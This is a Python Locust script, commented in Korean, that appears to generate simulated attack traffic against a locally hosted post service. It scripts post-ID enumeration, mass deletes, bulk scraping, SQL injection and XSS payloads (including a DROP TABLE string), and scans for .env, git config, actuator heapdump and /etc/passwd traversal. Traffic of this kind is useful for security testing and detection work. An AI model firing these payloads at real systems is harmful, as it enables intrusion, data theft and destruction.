# attack_post_locustfile.py — post-service 공격 트래픽 (P1~P6, attack.md 기준)
#
# 실행:
#   $env:HOST="http://localhost:8082"; $env:AUTH_HOST="http://localhost:8080"
#   locust -f attacks/attack_post_locustfile.py --host http://localhost:8082 \
#          --users 10 --spawn-rate 5 --run-time 120s --headless
#
# env: HOST(post), AUTH_HOST(auth), ID_RANGE(열거 상한, 기본 300)
# 시퀀스: P1/P2/P3 ★★★(순차 열거·삭제), P4/P6 ★★☆, P5 ★☆☆.

import os
import uuid
import random
import logging

import requests
from locust import HttpUser, task, between

logger = logging.getLogger(__name__)

AUTH_HOST = os.environ.get("AUTH_HOST", "http://localhost:8080")
ID_RANGE = int(os.environ.get("ID_RANGE", "300"))

SQLI = ["' OR '1'='1", "'; DROP TABLE posts;--", "' UNION SELECT NULL,NULL--"]
XSS = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>"]
SCAN_PATHS = [
    "/.env", "/.git/config", "/actuator/env", "/actuator/heapdump",
    "/actuator/mappings", "/admin", "/config.js", "/swagger-ui.html",
    "/api/../../etc/passwd", "/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
]


def hit(cm):
    with cm as r:
        r.success()


def _get_token():
    u = f"attacker_{uuid.uuid4().hex[:8]}"
    try:
        requests.post(f"{AUTH_HOST}/api/auth/signup", json={
            "username": u, "email": f"{u}@t.local", "password": "Atk@12345!"}, timeout=10)
        r = requests.post(f"{AUTH_HOST}/api/auth/login",
                          json={"username": u, "password": "Atk@12345!"}, timeout=10)
        if r.ok:
            return r.json().get("accessToken")
    except Exception as exc:
        logger.warning("token 확보 실패: %s", exc)
    return None


class PostAttacker(HttpUser):
    host = os.environ.get("HOST", "http://localhost:8082")
    wait_time = between(0.02, 0.2)

    def on_start(self):
        self._token = _get_token()
        self._cursor = 1  # 순차 열거 카운터

    def _auth(self):
        return {"Authorization": f"Bearer {self._token}"} if self._token else {}

    def _next_id(self):
        i = self._cursor
        self._cursor = self._cursor % ID_RANGE + 1
        return i

    # P1 — postId 순차 열거/스크래핑 ★★★
    @task(3)
    def p1_enumerate(self):
        hit(self.client.get(f"/api/posts/{self._next_id()}",
                            headers=self._auth(), name="P1 GET /api/posts/[id]",
                            catch_response=True))

    # P2 — 존재 오라클 열거 (무인증 internal) ★★★
    @task(3)
    def p2_exists_oracle(self):
        hit(self.client.get(f"/internal/posts/{self._next_id()}/exists",
                            name="P2 GET /internal/posts/[id]/exists",
                            catch_response=True))

    # P3 — 대량 삭제 시도 (순차 DELETE, 소유권으로 대개 403/404) ★★★
    @task(2)
    def p3_mass_delete(self):
        hit(self.client.delete(f"/api/posts/{self._next_id()}",
                              headers=self._auth(), name="P3 DELETE /api/posts/[id]",
                              catch_response=True))

    # P4 — 벌크 exfiltration (전 페이지 순회) ★★☆
    @task(2)
    def p4_bulk_exfil(self):
        page = random.randint(1, 50)
        hit(self.client.get(f"/api/posts?page={page}&size=50",
                            headers=self._auth(), name="P4 GET /api/posts[bulk]",
                            catch_response=True))

    # P5 — 게시글 SQLi/XSS 페이로드 주입 ★☆☆
    @task(1)
    def p5_sqli_xss(self):
        payload = {"title": random.choice(SQLI + XSS),
                   "content": random.choice(SQLI + XSS)}
        hit(self.client.post("/api/posts", json=payload, headers=self._auth(),
                            name="P5 POST /api/posts[inject]", catch_response=True))

    # P6 — 경로 탐색/엔드포인트 스캔 ★★☆
    @task(1)
    def p6_path_scan(self):
        hit(self.client.get(random.choice(SCAN_PATHS),
                            name="P6 GET [scan]", catch_response=True))
